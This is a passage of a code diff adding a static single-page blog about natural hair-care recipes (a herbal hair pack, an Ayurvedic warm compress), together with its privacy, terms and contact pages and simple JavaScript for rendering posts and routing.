+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Natural hair remedies work gradually. Give any new routine at least four to six weeks before judging whether it is making a difference, since hair growth and repair both happen slowly and are easy to underestimate week to week.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Rosemary water: scalp spray for growth and stronger roots, 2 to 3 times a week.</li>
+    <li>Rice water: final rinse for shine and strength, 1 to 2 times a week.</li>
+    <li>Banana and honey mask: deep hydration for dry hair, once a week.</li>
+    <li>Space treatments across the week rather than combining them all at once.</li>
+    <li>Give the routine four to six weeks before expecting visible results.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion</h2>
+
+<p>You do not need a crowded shelf of products to take good care of your hair. Rosemary water, rice water, and a banana and honey mask cover growth, shine, and hydration using nothing more than herbs and pantry staples. Pick a rhythm that fits your week, stay consistent, and let your hair show the results.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Rosemary Water for Hair</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Rice Water Rinse</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Banana Honey Hair Mask</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Natural Hair Growth</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">DIY Hair Care</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Hair Hydration Tips</span>
+</div>
+                `
+            },
+            {
+                id: 'diy-natural-hair-pack-recipe',
+                title: 'DIY Natural Hair Pack Recipe',
+                date: 'August 3, 2026',
+                image: './assets/DIY Natural Hair Pack Recipe.png',
+                excerpt: "Meet your scalp's new favorite ritual 🌸 This 3-ingredient Natural Hair Pack blends soothing aloe vera, strengthening hibiscus, and scalp-loving tulsi into one nourishing paste that fights hair fall and dandruff at the root.<br>• Grind, apply, and relax for 30-45 minutes, then rinse like normal<br>• Just 1-2 uses a week builds noticeably stronger, shinier hair over time<br>It's chemical-free, budget-friendly, and honestly kind of relaxing to make. A perfect Sunday reset for your hair. Save this recipe for your next self-care day! 💚",
+                content: `
+<p>Some of the best hair care recipes only need three ingredients and a little patience, and this natural hair pack is a perfect example. Aloe vera, hibiscus, and tulsi come together into a smooth green paste that has been trusted for generations to calm the scalp, fight hair fall, and leave hair genuinely softer and shinier after just one use.</p>
+
+<p>What makes this hair pack special is how each ingredient plays a distinct role. Aloe soothes, hibiscus strengthens, and tulsi supports overall scalp health, so instead of layering multiple products, you get a complete treatment from one simple bowl of paste.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>This hair pack blends just three ingredients: aloe vera gel, hibiscus leaf, and tulsi leaf.</li>
+    <li>Aloe vera soothes the scalp and helps reduce dandruff while supporting growth.</li>
+    <li>Hibiscus is traditionally used to strengthen hair and prevent hair fall.</li>
+    <li>Tulsi supports scalp health and is believed to help fight dandruff.</li>
+    <li>Used once or twice a week, it builds toward softer, stronger, shinier hair over time.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why These Three Ingredients Work So Well Together</h2>
+
+<p>Aloe vera gel is a natural soother, often reached for to calm irritated skin, and the scalp is no exception. It is commonly used to reduce dandruff and support a healthier growth environment, all while feeling cooling and gentle the moment it is applied.</p>
+
+<p>Hibiscus leaf, meanwhile, has a long history in traditional hair care as a strengthening ingredient. It is believed to help prevent hair fall and add natural shine, which is part of why hibiscus oils and pastes remain a staple in so many hair care routines. Tulsi, or holy basil, rounds out the trio by supporting overall scalp health and helping fight dandruff, making it a natural partner for the other two ingredients.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> This hair pack is a supportive, traditional remedy rather than a medical treatment. If you are dealing with persistent hair loss or a scalp condition, it is worth pairing home remedies like this with advice from a dermatologist.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Ingredients You Will Need</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The Three Core Ingredients</h3>
+
+<ul>
+  <li><strong>Natural aloe vera gel</strong>, fresh from the leaf if possible, to soothe the scalp and reduce dandruff.</li>
+  <li><strong>Hibiscus leaf</strong>, fresh or dried, to strengthen hair and add natural shine.</li>
+  <li><strong>Tulsi leaf</strong>, to support scalp health and help fight dandruff.</li>
+</ul>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Fresh vs Dried Leaves</h4>
+
+<p>Fresh hibiscus and tulsi leaves grind into the smoothest paste, but dried leaves work well too, simply soak them briefly in warm water first to soften before blending.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Make and Use the Natural Hair Pack</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step-by-Step Instructions</h3>
+
+<ol>
+  <li>Take the natural aloe vera gel, hibiscus leaf, and tulsi leaf together.</li>
+  <li>Grind or blend all three ingredients into a smooth, even paste.</li>
+  <li>Apply the pack evenly over your scalp and hair, working section by section.</li>
+  <li>Leave it on for 30 to 45 minutes so the ingredients can absorb.</li>
+  <li>Rinse thoroughly with a mild shampoo, using 1 to 2 times a week for best results.</li>
+</ol>
+
+<div style="background:#f1f5f9;border:1px solid #cbd5e1;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Why This Matters</h3>
+  <p style="margin:0;color:#334155;">Grinding all three ingredients together, rather than applying them separately, is what turns this into an easy weekly ritual instead of a multi-step routine. One paste, one application, one rinse.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Benefits of Using This Hair Pack Regularly</h2>
+
+<ul>
+  <li><strong>Reduces hair fall</strong> with the strengthening support of hibiscus.</li>
+  <li><strong>Prevents dandruff</strong> thanks to the soothing, calming properties of aloe and tulsi.</li>
+  <li><strong>Promotes new hair growth</strong> by supporting a healthier scalp environment.</li>
+  <li><strong>Makes hair soft, strong, and shiny</strong> after regular use.</li>
+</ul>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Apply the pack to dry hair before washing, not freshly shampooed hair. This lets the paste work on your natural scalp environment before you rinse everything away.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Making It a Weekly Ritual</h2>
+
+<p>Because this pack takes a little prep, treat it as a slower, more intentional part of your week rather than a rushed weekday task. Many people set aside a quiet afternoon, mix the paste, apply it while relaxing, and rinse it out as the finishing step of a self-care day.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Consistency is what makes this remedy work. One application will leave hair feeling soft, but the hair fall and dandruff benefits build gradually with regular weekly use over several weeks.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Quick Points</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Three ingredients: aloe vera gel, hibiscus leaf, tulsi leaf.</li>
+    <li>Grind into a paste, apply to scalp and hair, leave for 30 to 45 minutes.</li>
+    <li>Rinse with a mild shampoo, 1 to 2 times a week.</li>
+    <li>100% natural and chemical-free.</li>
+    <li>Best results come with regular, weekly use.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion</h2>
+
+<p>This natural hair pack proves that effective hair care does not need a long ingredient list. Aloe vera, hibiscus, and tulsi combine into a soothing, strengthening paste that fits easily into a weekly self-care routine. Give it a try this week and let your scalp enjoy the reset.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Natural Hair Pack</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Hibiscus for Hair</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Aloe Vera Hair Care</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Tulsi for Scalp</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Chemical Free Haircare</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Dandruff Remedy</span>
+</div>
+                `
+            },
+            {
+                id: 'ancient-ayurvedic-hair-care-ritual',
+                title: 'Ancient Ayurvedic Hair Care Ritual for Hair growth',
+                date: 'October 14, 2026',
+                image: './assets/Ancient Ayurvedic Hair Care Ritual for Hair growth.png',
+                excerpt: "Slow down and give your hair the ancient TLC it deserves 🌾 This Ayurvedic Hair Care Ritual uses a warm herbal compress filled with fenugreek, mustard seeds, cloves and more to relax your scalp while nourishing hair from root to tip.<br>• Gentle heat opens pores so herbs can work deeper into the scalp<br>• Doubles as a calming self-care ritual, not just a hair treatment<br>Just make sure the compress stays comfortably warm, never hot. Add this centuries-old practice to your routine and feel the difference. Save it for your next spa night at home! 🌿",
+                content: `
+<p>Long before modern hair serums existed, Ayurvedic tradition already had a beautifully simple answer for tired, stressed hair: a warm herbal compress. This ritual wraps a bundle of nourishing seeds and herbs in cloth, warms it gently, and presses it against the scalp, combining the benefits of herbal infusion with the relaxation of gentle heat therapy.</p>
+
+<p>It is part hair treatment, part slow-down ritual, and that combination is exactly what makes it so appealing today. In a world of quick five-minute routines, this ancient practice asks you to actually sit, breathe, and let warmth and herbs do their work at their own pace.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>This Ayurvedic ritual uses a warm herbal compress, a cloth bundle of seeds and herbs gently heated and pressed to the scalp.</li>
+    <li>Warmth is believed to help open the scalp's pores so the herbal benefits can absorb more deeply.</li>
+    <li>Common compress ingredients include fenugreek, mustard seeds, cloves, and other traditional Ayurvedic botanicals.</li>
+    <li>Beyond hair benefits, the ritual is deeply relaxing and doubles as a stress-relief practice.</li>
+    <li>The compress should always stay comfortably warm, never hot, to avoid any risk of burns.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">What Is the Ayurvedic Herbal Compress Ritual</h2>
+
+<p>At its core, this ritual is simple: a collection of hair-nourishing seeds and herbs, such as fenugreek, mustard seeds, and cloves, is tied into a small cloth bundle, gently warmed, and then pressed against the scalp in slow, soothing motions. The warmth helps release the herbs' natural properties while the compress itself feels like a warm, comforting massage tool.</p>
+
+<p>This is not a rushed five-minute step. It is meant to be unhurried, often paired with closed eyes, slow breathing, and a quiet moment set aside just for this ritual, which is part of why it has remained a beloved self-care tradition for so long.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> The compress should always be used only comfortably warm. If it ever feels too hot to hold near your skin, let it cool slightly before continuing, since scalp skin is sensitive and burns easily.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Three Pillars of This Ritual</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Warm Herbal Compress</h3>
+
+<p>The compress itself is the heart of the ritual, a fabric bundle filled with seeds and herbs that release their properties as gentle heat is applied. Unlike a leave-on paste, this method is dry and mess-free, making it an easy addition to an evening routine.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Relaxing Scalp Care</h3>
+
+<p>Pressing and gently massaging the compress across the scalp is as much about relaxation as it is about hair health. The combination of warmth and light pressure is often described as instantly calming, similar to a mini spa treatment you can do at home.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Healthy Hair Routine</h3>
+
+<p>Used consistently, this ritual becomes a foundation for a broader healthy hair routine, one built on traditional botanicals rather than synthetic treatments, and on slowing down rather than rushing through hair care.</p>
+
+<div style="background:#f1f5f9;border:1px solid #cbd5e1;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Why This Matters</h3>
+  <p style="margin:0;color:#334155;">Gentle heat is believed to help open the scalp's pores, which is thought to allow the herbal compress to work more effectively than a cold application. This is part of why warmth, not just the herbs themselves, is such a central part of the tradition.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">What Goes Into the Herbal Bundle</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Traditional Ingredients to Include</h3>
+
+<ul>
+  <li><strong>Fenugreek seeds</strong>, valued for supporting scalp health and hair strength.</li>
+  <li><strong>Mustard seeds</strong>, traditionally used for their warming properties.</li>
+  <li><strong>Cloves</strong>, prized for their rich aroma and traditional role in Ayurvedic remedies.</li>
+  <li><strong>A soft cotton cloth</strong>, tied securely to hold the herbs in a compact bundle.</li>
+</ul>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Warming the Compress Safely</h4>
+
+<p>Warm the bundle gently, such as briefly over steam, then always test it against your wrist before bringing it near your scalp. It should feel pleasantly warm, similar to a cup of tea you can comfortably hold, never hot to the touch.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Practice the Ritual Step by Step</h2>
+
+<ol>
+  <li>Tie the fenugreek, mustard seeds, cloves, and any other chosen herbs securely into a small cotton cloth bundle.</li>
+  <li>Warm the bundle gently until it feels comfortably warm, then test it against your wrist.</li>
+  <li>Sit in a quiet, comfortable spot and press the warm compress against your scalp, moving slowly section by section.</li>
+  <li>Breathe slowly and let the warmth and aroma settle in for several minutes.</li>
+  <li>Re-warm the compress as needed if it cools, always testing the temperature again before reapplying.</li>
+</ol>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Dim the lights, put on some quiet music, and treat this like an actual ritual rather than a task to rush through. The slower pace is part of what makes this remedy so effective as a stress-relief practice too.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Building This Into Your Weekly Routine</h2>
+
+<p>This ritual is best treated as a weekly reset rather than a daily habit, since the preparation and unhurried pace make it naturally suited to a slower evening, perhaps once a week as part of a broader self-care night alongside a warm bath or a favorite book.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Always keep the compress at a comfortably warm temperature and avoid it entirely if you have any scalp sensitivity, sunburn, or open wounds on your scalp, since the goal is relaxation, never discomfort.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Tie fenugreek, mustard seeds, and cloves into a cotton cloth bundle.</li>
+    <li>Warm gently and test on your wrist before use, comfortably warm, never hot.</li>
+    <li>Press slowly against the scalp, breathing and relaxing as you go.</li>
+    <li>Best practiced weekly as part of a slower self-care evening.</li>
+    <li>Skip it entirely on sensitive, sunburned, or broken scalp skin.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion</h2>
+
+<p>This Ayurvedic herbal compress ritual is a reminder that hair care does not always need to be quick to be effective. With a simple cloth bundle of traditional herbs and a little warmth, you can turn a weekly routine into a genuinely restorative ritual for both your scalp and your mind. Give yourself the time this practice asks for, and let the slowness be part of the benefit.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Ayurvedic Hair Care</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Herbal Hair Ritual</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Scalp Care</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Natural Hair Remedies</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Self Care Rituals</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Hair Growth Tips</span>
+</div>
+                `
+            }
+
+        ];
+
+        // Static Legal Pages (Required for AdSense & Pinterest)
+        const pages = {
+            'about': {
+                title: 'About Us',
+                content: `
+                    <p>Welcome to <strong>Daily Life Handcrafted</strong>!</p>
+                    <p>Our mission is to create a positive, inspiring, and safe space on the internet where we share simple, natural recipes for skincare, self-care, and everyday handmade living.</p>
+                    <p>Whether you are here to try your first DIY hair treatment, find a new natural beauty ritual, or just enjoy some slow, cozy inspiration, we are glad you stopped by. We strive to provide high-quality, family-friendly content that sparks creativity and a little self-care.</p>
+                    <p>Thank you for being part of our community!</p>
+                `
+            },
+            'privacy': {
+                title: 'Privacy Policy',
+                content: `
+                    <p><strong>Last updated: May 2026</strong></p>
+                    <p>At Daily Life Handcrafted, one of our main priorities is the privacy of our visitors. This Privacy Policy document contains types of information that is collected and recorded by us and how we use it.</p>
+
+                    <h3>Log Files</h3>
+                    <p>We follow a standard procedure of using log files. The information collected includes internet protocol (IP) addresses, browser type, Internet Service Provider (ISP), date and time stamp, referring/exit pages, and possibly the number of clicks. These are not linked to any information that is personally identifiable. The purpose of the information is for analyzing trends and administering the site.</p>
+
+                    <h3>Cookies and Web Beacons</h3>
+                    <p>Like any other website, we use "cookies". These cookies are used to store information including visitors' preferences, and the pages on the website that the visitor accessed or visited. The information is used to optimize the users' experience by customizing our web page content based on visitors' browser type and/or other information.</p>
+
+                    <h3>Google AdSense & Third-Party Privacy Policies</h3>
+                    <p>Third-party ad servers or ad networks use technologies like cookies, JavaScript, or Web Beacons that are used in their respective advertisements and links that appear on our blog. They automatically receive your IP address when this occurs.</p>
+                    <ul>
+                        <li>Third-party vendors, including Google, use cookies to serve ads based on a user's prior visits to your website or other websites.</li>
+                        <li>Google's use of advertising cookies enables it and its partners to serve ads to your users based on their visit to your sites and/or other sites on the Internet.</li>
+                        <li>Users may opt out of personalized advertising by visiting Google's <a href="https://www.google.com/settings/ads" target="_blank" rel="noopener noreferrer">Ads Settings</a>. Alternatively, you can opt out of a third-party vendor's use of cookies for personalized advertising by visiting <a href="https://www.aboutads.info/choices/" target="_blank" rel="noopener noreferrer">www.aboutads.info</a>.</li>
+                    </ul>
+
+                    <h3>Pinterest and Social Media</h3>
+                    <p>We may use social media features, such as the Pinterest "Save" button or Pinterest analytics tags, which may collect your IP address and which page you are visiting on our site, and may set a cookie to enable the feature to function properly. Your interactions with these features are governed by the privacy policy of the company providing it (e.g., the <a href="https://policy.pinterest.com/en/privacy-policy" target="_blank" rel="noopener noreferrer">Pinterest Privacy Policy</a>).</p>
+
+                    <h3>Children's Information</h3>
+                    <p>Another part of our priority is adding protection for children while using the internet. We encourage parents and guardians to observe, participate in, and/or monitor and guide their online activity. We do not knowingly collect any Personal Identifiable Information from children under the age of 13. If you think that your child provided this kind of information on our website, we strongly encourage you to contact us immediately and we will do our best efforts to promptly remove such information from our records.</p>
+                `
+            },
+            'terms': {
+                title: 'Terms of Service',
+                content: `
+                    <p><strong>Effective Date: May 2026</strong></p>
+                    <h3>1. Acceptance of Terms</h3>
+                    <p>By accessing and using this website, you accept and agree to be bound by the terms and provision of this agreement.</p>
+
+                    <h3>2. User Conduct</h3>
+                    <p>Our blog is a family-friendly space. You agree to use the site only for lawful purposes. You agree not to take any action that might compromise the security of the site, render the site inaccessible to others, or otherwise cause damage to the site or the content.</p>
+
+                    <h3>3. Intellectual Property</h3>
+                    <p>The content, organization, graphics, design, and other matters related to the Site are protected under applicable copyrights and proprietary rights. The copying or redistribution by you of any such matters is strictly prohibited without our express written permission.</p>
+
+                    <h3>4. Disclaimer of Warranties</h3>
+                    <p>The materials on our website are provided on an 'as is' basis. We make no warranties, expressed or implied, regarding the accuracy, likely results, or reliability of the use of the materials on its website.</p>
+
+                    <h3>5. Links to Other Websites</h3>
+                    <p>Our website may contain links to third-party web sites or services (such as advertisers or social media platforms like Pinterest) that are not owned or controlled by us. We have no control over, and assume no responsibility for, the content or privacy policies of any third party web sites.</p>
+                `
+            },
+            'contact': {
+                title: 'Contact Us',
+                content: `
+                    <p>We would love to hear from you! Whether you have a question about our content, need assistance with our website, or want to inquire about our Privacy Policy and Terms of Service, feel free to reach out.</p>
+                    <p><strong>Email:</strong> <a href="mailto:hello@dailylifehandcrafted.com">hello@dailylifehandcrafted.com</a></p>
+                    <p>Please note that we aim to respond to all inquiries within 48 to 72 hours. We kindly ask that all communications remain respectful and appropriate.</p>
+                `
+            }
+        };
+
+        // 2. Application Logic
+        const app = document.getElementById('app');
+        const blogUsername = "Daily Life Handcrafted";
+        const avatarUrl = "./assets/blog-avatar.jpg"; // A placeholder avatar
+
+        // Function to render the home page (list of posts)
+        function renderHome() {
+            let html = '';
+            posts.forEach(post => {
+                html += `
+                    <div class="post-card" onclick="navigate('post', '${post.id}')">
+                        <div class="post-header">
+                            <img class="avatar" src="${avatarUrl}" alt="Avatar">
+                            <span class="username">${blogUsername}</span>
+                        </div>
+                        <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/540x400?text=Image+Not+Found'">
+                        <div class="post-content">
+                            <h2>${post.title}</h2>
+                            <p>${post.excerpt}</p>
+                        </div>
+                        <div class="post-footer">
+                            <span>${post.date}</span>
+                            <span style="letter-spacing: 10px; font-size: 1.1rem;">↻ ♥</span>
+                        </div>
+                    </div>
+                `;
+            });
+            app.innerHTML = html;
+        }
+
+        // Function to render a static page (like Privacy Policy)
+        function renderPage(pageId) {
+            const page = pages[pageId];
+
+            if (!page) {
+                app.innerHTML = `<p style="color: white;">Page not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-content" style="padding-top: 30px; padding-bottom: 30px;">
+                        <h1>${page.title}</h1>
+                        ${page.content}
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0); // Scroll to top
+        }
+
+        // Function to render a single post
+        function renderPost(postId) {
+            const post = posts.find(p => p.id === postId);
+
+            if (!post) {
+                app.innerHTML = `<p style="color: white;">Post not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-header">
+                        <img class="avatar" src="${avatarUrl}" alt="Avatar">
+                        <span class="username">${blogUsername}</span>
+                    </div>
+                    <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/540x400?text=Image+Not+Found'">
+                    <div class="post-content">
+                        <h1>${post.title}</h1>
+                        ${post.content}
+                    </div>
+                    <div class="post-footer">
+                        <span>${post.date}</span>
+                        <span style="letter-spacing: 10px; font-size: 1.1rem;">↻ ♥</span>
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0); // Scroll to top
+        }
+
+        // Simple router/navigator
+        function navigate(view, id = null) {
+            if (view === 'home') {
+                window.location.hash = '';
+                renderHome();
+            } else if (view === 'post') {
+                window.location.hash = id;
+                renderPost(id);
+            } else if (view === 'page') {
+                window.location.hash = id;
+                renderPage(id);
+            }
+        }
+
+        // Listen for browser back/forward buttons
+        window.addEventListener('hashchange', () => {
+            const hash = window.location.hash.replace('#', '');
+            if (hash) {
+                // Check if the hash matches a static page, otherwise assume it's a post
+                if (pages[hash]) {
+                    renderPage(hash);
+                } else {
+                    renderPost(hash);
+                }
+            } else {
+                renderHome();
+            }
+        });
+
+        // Initial Load
+        const initialHash = window.location.hash.replace('#', '');
+        if (initialHash) {
+            if (pages[initialHash]) {
+                renderPage(initialHash);
+            } else {
+                renderPost(initialHash);
+            }
+        } else {
+            renderHome();
+        }
+    </script>
+</body>
+
+</html>
